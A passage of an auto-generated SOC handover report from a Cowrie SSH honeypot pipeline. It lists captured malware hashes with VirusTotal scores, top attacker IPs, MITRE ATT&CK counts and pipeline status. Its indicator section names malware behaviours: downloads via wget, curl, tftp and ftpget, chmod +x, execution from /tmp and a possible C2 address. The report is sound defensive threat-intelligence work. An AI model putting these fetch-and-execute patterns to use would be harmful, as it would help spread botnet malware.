| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `174.94.236[.]211` | CA | Bell Mobility, Inc. | **100** ⚠️ | 50 |
| `14.54.22[.]11` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `14.99.61[.]248` | IN | TATATELESERVICES-Delhi | **100** ⚠️ | 50 |
| `136.116.189[.]132` | US | Google LLC | **100** ⚠️ | 3 |
| `211.220.156[.]232` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `180.76.52[.]146` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `111.70.23[.]236` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `207.219.221[.]101` | CA | TELUS Communications Inc. | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 130 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 5 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 183 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (11.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 55 priority case(s) shown individually · 25 recon entry/entries in table (13 group(s) consolidating 95 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T15:10:44Z_
